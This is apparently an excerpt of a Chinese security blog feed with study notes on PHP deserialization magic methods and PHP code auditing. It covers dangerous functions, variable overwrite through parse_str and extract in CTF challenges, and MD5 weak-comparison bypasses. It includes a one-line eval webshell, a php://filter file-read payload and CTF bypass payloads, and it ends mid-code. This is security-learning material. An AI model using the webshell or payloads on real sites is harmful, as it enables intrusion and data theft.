    <content type="html"><![CDATA[<h2 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h2><ul><li><p>__construct()：<br>实例化对象时被调用。</p></li><li><p>__wakeup()：<br>unserialize时被调用，先运行__wakeup()函数做些对象的初始化工作。<br><code>__wakeup()函数漏洞与对象的属性个数有关，如果序列化后的字符串中表示属性个数的数字与真实属性个数一致，那么就调用</code> </p></li><li><p>与__sleep()函数相反，__sleep()函数，是在序列化时被自动调用。__wakeup()函数，在反序列化时，被自动调用。绕过：当反序列化字符串，表示属性个数的值大于真实属性个数时，会跳过__wakeup函数的执行   __wakeup()函数。</p></li><li><p>__destruct()：<br>当删除一个对象或对象操作终止时被调用。</p><blockquote><p><strong>注意：私有字段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。这里是因为username和password为私有字段。</strong></p></blockquote></li><li><p>__toString() &#x2F;&#x2F;当一个对象被当作一个字符串使用</p></li><li><p>__sleep()&#x2F;&#x2F;在对象在被序列化之前运行</p></li><li><p>__wakeup()&#x2F;&#x2F;将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)</p></li><li><p>__get()&#x2F;&#x2F;获得一个类的成员变量时调用</p></li><li><p>__set()&#x2F;&#x2F;设置一个类的成员变量时调用</p></li><li><p>__invoke()&#x2F;&#x2F;调用函数的方式调用一个对象时的回应方法</p></li><li><p>__call()&#x2F;&#x2F;当调用一个对象中的不能用的方法的时候就会执行这个函数</p></li></ul><p><strong>protected private两者的区别</strong></p><blockquote><p>protected声明的字段为保护字段，在所声明的类和该类的子类中可见，但在该类的对象实例中不可见。因此保护字段的字段名在序列化时，字段名前面会加上\0\0的前缀。这里的\0表示 ASCII 码为 0 的字符(不可见字符)，而不是 \0组合。这也许解释了，为什么如果直接在网址上，传递\0\0username会报错，因为实际上并不是\0，只是用它来代替ASCII值为0的字符。必须用python传值才可以。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//运行会输出 O:4:&quot;Name&quot;:2:&#123;s:11:&quot; * username&quot;;s:5:&quot;admin&quot;;s:11:&quot; * password&quot;;i:100;&#125;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字</p><p>段的字段名在序列化时，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度。其中\0<br>字符也是计算长度的。</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Name</span></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;nonono&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;yesyes&#x27;</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>,<span class="hljs-variable">$password</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Name</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-number">100</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-comment">//O:4:&quot;Name&quot;:2:&#123;s:14:&quot; Name username&quot;;s:5:&quot;admin&quot;;s:14:&quot; Name password&quot;;i:100;&#125; 注意name前后的空格</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP代码审计</title>
    <link href="/2022/03/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2022/03/03/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="常见函数及特殊函数"><a href="#常见函数及特殊函数" class="headerlink" title="常见函数及特殊函数"></a>常见函数及特殊函数</h2><h3 id="PHP代码执行函数"><a href="#PHP代码执行函数" class="headerlink" title="PHP代码执行函数"></a>PHP代码执行函数</h3><h4 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h4><figure class="highlight php"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span>)<br>把字符串<span class="hljs-variable">$code</span> 作为php代码执行<br>很多常见的webshell都是用<span class="hljs-keyword">eval</span>来执行具体操作的。<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">assert</span>()<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$assertion</span> [<span class="hljs-keyword">string</span> <span class="hljs-variable">$description</span>]<br>检查一个断言是否为<span class="hljs-literal">FALSE</span> 把字符串<span class="hljs-variable">$assertion</span>作为PHP代码来执行具体操作的。<br></code></pre></td></tr></table></figure><h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span>[<span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span>[<span class="hljs-keyword">int</span>&amp;<span class="hljs-variable">$count</span>]])<br>/e 修正符使<span class="hljs-title function_ invoke__">preg_replace</span>()将replacement参数当做PHP代码<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/test/e&#x27;</span><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;h&#x27;</span>],<span class="hljs-string">&#x27;just test&#x27;</span>);<br>如果我们提交?h=<span class="hljs-title function_ invoke__">phpinfo</span>(),<span class="hljs-title function_ invoke__">phpinfo</span>()将会执行<br></code></pre></td></tr></table></figure><h4 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">create_function</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$args</span> , <span class="hljs-keyword">string</span> <span class="hljs-variable">$code</span> )<br>创建一个匿名函数，并返回一个独一无二的函数名<br><span class="hljs-variable">$newfunc</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&#x27;$v&#x27;</span>,<span class="hljs-string">&#x27;return system($v);&#x27;</span>);<br><span class="hljs-variable">$newfunc</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>); 就相当于<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> [, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$parameter</span> [, <span class="hljs-keyword">mixed</span> $... ]] )<br>call_user_func — 把第一个参数作为回调函数调用，其余参数是回调函数的参数。<br></code></pre></td></tr></table></figure><h4 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func_array</span> ( <span class="hljs-keyword">callable</span> <span class="hljs-variable">$callback</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$param_arr</span> )<br>把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。<br></code></pre></td></tr></table></figure><h3 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h3><p>require、include、 require_ once 、 include_once</p><blockquote><p>包含函数一共有四个 ,主要作用为包含并运行指定文件。<br>include $file;</p><p>在变量$file可控的情况下,我们就可以包含任意文件,从而达到getshell的目的。<br>另外,在不同的配置环境下,可以包含不同的文件。<br>因此又分为远程文件包含和本地文件包含。<br>包含函数也能狗读取任意文件内容,这就需要用到[支持的协议和封装协议]和[过滤器]。</p></blockquote><blockquote><p>例如,利用php流filter读取任意文件<br>include($_ GET[‘file’]);<br>?file&#x3D; php:&#x2F;&#x2F;filter&#x2F;convrt.base64-encode&#x2F;resource &#x3D;index.php</p></blockquote><h3 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">exec</span>()执行一个外部程序<br><span class="hljs-title function_ invoke__">passthru</span>()执行外部程序并且显示原始输出<br><span class="hljs-title function_ invoke__">proc_open</span>()执行一个命令，并且打开用来输入/输出的文件指针<br><span class="hljs-title function_ invoke__">shell_exec</span>()&amp;``通过shell环境执行命令，并且将完整的输出以字符串的方式返回。<br><span class="hljs-title function_ invoke__">system</span>()执行外部程序，并且显示输出<br><span class="hljs-title function_ invoke__">popen</span>()通过<span class="hljs-title function_ invoke__">popen</span>()的参数传递一条命令，并对<span class="hljs-title function_ invoke__">popen</span>()所打开的文件进行执行<br></code></pre></td></tr></table></figure><blockquote><p>执行函数包括但不限于上述几个。</p><p>只要命令的参数可控就能够执行系统命令。</p></blockquote><h3 id="文件操作函数"><a href="#文件操作函数" class="headerlink" title="文件操作函数"></a>文件操作函数</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">copy拷贝文件<br>file_get_contents 将整个文件读入一个字符串<br>file_put_contents将一个字符串写入文件<br>file 把整个文件读入一个数组中<br>fopen 打开文件或URL<br>move_uploaded_file 将上传文件移动到新的位置<br>readfile 输出文件<br>rename 重命名一个文件或目录<br>rmdir删除目录<br>unlink &amp; delete 删除文件<br></code></pre></td></tr></table></figure><blockquote><p>任意文件读取、写入、删除、往往是上面几个函数受到了控制（当然还有其他函数）</p><p>不同函数在不同的场景有不同的作用和不同的利用手法。</p><p>读取：可以读取配置等文件，按到key</p><p>写入：可以入shell代码相关的内容</p><p>删除：可以删除.lock文件而可以重新安装覆盖</p></blockquote><h3 id="特殊函数"><a href="#特殊函数" class="headerlink" title="特殊函数"></a>特殊函数</h3><h4 id="is-numeric"><a href="#is-numeric" class="headerlink" title="is_numeric()"></a>is_numeric()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">is_numeric</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> )<br>如果 <span class="hljs-keyword">var</span> 是数字和数字字符串则返回 <span class="hljs-literal">TRUE</span>，否则返回 <span class="hljs-literal">FALSE</span><br></code></pre></td></tr></table></figure><blockquote><p>仅用is_numeric判断而不用intval转换就有可能插入16进制字符串到数据库，进而可能导致sql二次注入。</p></blockquote><h4 id="in-array"><a href="#in-array" class="headerlink" title="in_array()"></a>in_array()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span> , <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span> [, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">FALSE</span> ] ) <br>大海捞针，在大海（haystack）中搜索针（ needle），如果没有设置 strict 则使用宽松的比较。<br>该函数有一个特性，比较之前会进行自动类型转换。<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;1abc&#x27;</span>;<br><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$a</span>,<span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>))的返回<br></code></pre></td></tr></table></figure><h4 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">parse_str</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$encoded_string</span> [, <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$result</span> ] ) <br>将字符串解析成多个变量<br>如果 encoded_string 是 URL 传递入的查询字符串（query <span class="hljs-keyword">string</span>），则将它解析为变量并设置到当前作用域（如果提供了 result 则会设置到该数组里 ）。<br></code></pre></td></tr></table></figure><p><strong>parse_str()导致的变量覆盖问题</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>       <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) <br>      &#123;<br>            <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>            <span class="hljs-keyword">die</span>();<br>      &#125; <br>      <span class="hljs-keyword">else</span> <br>     &#123;<br>            <span class="hljs-keyword">include</span> (‘flag.php’);<br>            <span class="hljs-variable">$a</span> = “www.OPENCTF.com <br>            <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>            @<span class="hljs-title function_ invoke__">parse_str</span>(<span class="hljs-variable">$id</span>);<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>] != ‘QNKCDZO’ &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>[<span class="hljs-number">0</span>]) == <span class="hljs-title function_ invoke__">md5</span>(‘QNKCDZO’)) <br>           &#123;<br>                 <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>           &#125; <br>           <span class="hljs-keyword">else</span> <br>           &#123;<br>                 <span class="hljs-keyword">exit</span>(‘其实很简单其实并不难！’);<br>           &#125;<br><br>       &#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>使用GET请求id&#x3D;a[0]&#x3D;240610708，这样会将a[0]的值覆盖为<strong>240610708</strong>，然后经过md5后得到<strong>0e462097431906509019562988736854与md5(‘QNKCDZO’)<strong>的结果</strong>0e830400451993494058024219903391</strong>比较都是0 所以相等，满足条件，得到flag。</p></blockquote><h4 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">extract — 从数组中将变量导入到当前的符号表<br><br>说明<br><span class="hljs-title function_ invoke__">extract</span> ( <span class="hljs-keyword">array</span> &amp;<span class="hljs-variable">$array</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$flags</span> = EXTR_OVERWRITE [, <span class="hljs-keyword">string</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-literal">NULL</span> ]] )<br>本函数用来将变量从数组中导入到当前的符号表中。<br><br>检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。<br></code></pre></td></tr></table></figure><p><strong>extract()函数导致的变量覆盖问题</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>   <span class="hljs-variable">$flag</span> = ‘xxx’;<br><br>   <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>);<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$gift</span>)) <br>  &#123;<br>       <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$flag</span>));<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$gift</span> == <span class="hljs-variable">$content</span>) <br>      &#123;<br>            <span class="hljs-keyword">echo</span> ‘hctf&#123;…&#125;’;<br><br>      &#125; <br>       <span class="hljs-keyword">else</span> <br>      &#123;<br>           <span class="hljs-keyword">echo</span> ‘Oh..’;<br>      &#125;<br><br>   &#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>题目分析：</strong> </p><blockquote><p>题目使用了**extract($_GET)<strong>接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用</strong>extract()**对变量进行覆盖，从而满足各个条件。</p></blockquote><p><strong>解题方法：</strong> </p><blockquote><p>GET请求 ?flag&#x3D;&amp;gift&#x3D;，extract()会将flag和flag和gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足gift&#x3D;&#x3D;content。</p><p>最终PAYLOAD： </p><p>GET DATA： ?flag&#x3D;&amp;gift&#x3D;</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REQUEST_METHOD&quot;</span>] == “POST”) <br>   &#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$pass</span> == <span class="hljs-variable">$thepassword_123</span>) <br>       &#123; <br><br>            &lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=”<span class="hljs-title">alert</span> <span class="hljs-title">alert</span>-<span class="hljs-title">success</span>”&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">            &lt;<span class="hljs-title">code</span>&gt;&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> $<span class="hljs-title">theflag</span>; ?&gt;&lt;/<span class="hljs-title">code</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">            &lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">        &#125; </span><br><span class="hljs-class">    &#125;</span><br><span class="hljs-class">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>题目分析：</strong> </p><blockquote><p>题目要求使用POST提交数据，<strong>extract($_POST)<strong>会将POST的数据中的键名和键值转换为相应的变量名和变量值，利用这个覆盖</strong>$pass</strong>和**$thepassword_123<strong>变量的值，从而满足</strong>pass&#x3D;&#x3D;thepassword_123**这个条件。</p></blockquote><p><strong>解题方法：</strong> </p><blockquote><p>使用POST请求提交<strong>pass&#x3D;&amp;thepassword_123&#x3D;</strong>, 然后<strong>extract()<strong>会将接收到的数据将</strong>$pass</strong>和**$thepassword_123**变量的值覆盖为空，便满足条件了。</p><p>最终PAYLOAD： </p><p>POST DATA：pass&#x3D;&amp;thepassword_123&#x3D;</p></blockquote><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp()"></a>strcmp()</h4><blockquote><p>strcmp(str1, str2)比较两个字符串大小，若是非字符串（例如数组）比较，则会出错。在5.3之前的php中，显示了报错的警告信息后，将return 0。0&#x3D;&#x3D;0执行</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;xxxxx&#125;&quot;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>], <span class="hljs-variable">$flag</span>) == <span class="hljs-number">0</span>) <span class="hljs-comment">//如果 str1 小于 str2 返回 &lt; 0； 如果 str1大于 str2返回 &gt; 0；如果两者相等，返回 0。</span><br><span class="hljs-comment">//比较两个字符串（区分大小写）</span><br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Flag: &#x27;</span>.<span class="hljs-variable">$flag</span>);<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;No&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="md5"><a href="#md5" class="headerlink" title="md5()"></a>md5()</h4><p>12&#x2F;2&#x2F;2020 </p><p>雨   正常</p><p>记录一些常见的md5绕过姿势</p><ol><li>md5弱类型比较</li></ol><ul><li><p>数组绕过</p><blockquote><p>md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。<br>数组绕过适用于源码中没有判断变量类型或内容，如果加上了过滤函数就不能使用了</p></blockquote><blockquote><p>常见过滤函数如下：<br>ctype_alnum ( string $text ) : bool<br>&#x2F;&#x2F; 如果text中所有的字符全部是字母和(或者)数字，返回 TRUE 否则返回FALSE </p><p>is_numeric ( mixed $var ) : bool<br>&#x2F;&#x2F; 如果 var 是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p></blockquote></li><li><p>科学计数法绕过</p><blockquote><p>只要两个数的md5加密后的值以0e开头就可以绕过，因为php在进行弱类型比较 即=&#x3D;时,会现转换字符串的类型，在进行比较，而在比较是因为两个数都是以0e开头会被认为是科学计数法，0e后面加任何数在科学计数法中都是0，所以两数相等，在进行严格比较&#x3D;&#x3D;&#x3D;时才会先判断字符串类型是否相等，在比较。<br>像这样特殊的md5值有：</p></blockquote></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">240610708:0e462097431906509019562988736854<br>QLTHNDT:0e405967825401955372549139051580<br>QNKCDZO:0e830400451993494058024219903391<br>PJNPDWY:0e291529052894702774557631701704<br>NWWKITQ:0e763082070976038347657360817689<br>NOOPCJF:0e818888003657176127862245791911<br>MMHUWUV:0e701732711630150438129209816536<br>MAUXXQC:0e478478466848439040434801845361<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>    <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$flag</span>);    <span class="hljs-comment">//可以使用数组绕过 也可以使用科学计数法绕过</span><br></code></pre></td></tr></table></figure><blockquote><p>因为是if的判断条件是两个数弱类型相等，就可以利用hash比较缺陷去绕过</p></blockquote><ol start="2"><li><p>md5强类型比较</p><p>数组绕过</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>])===<span class="hljs-title function_ invoke__">md5</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_GET</span>[<span 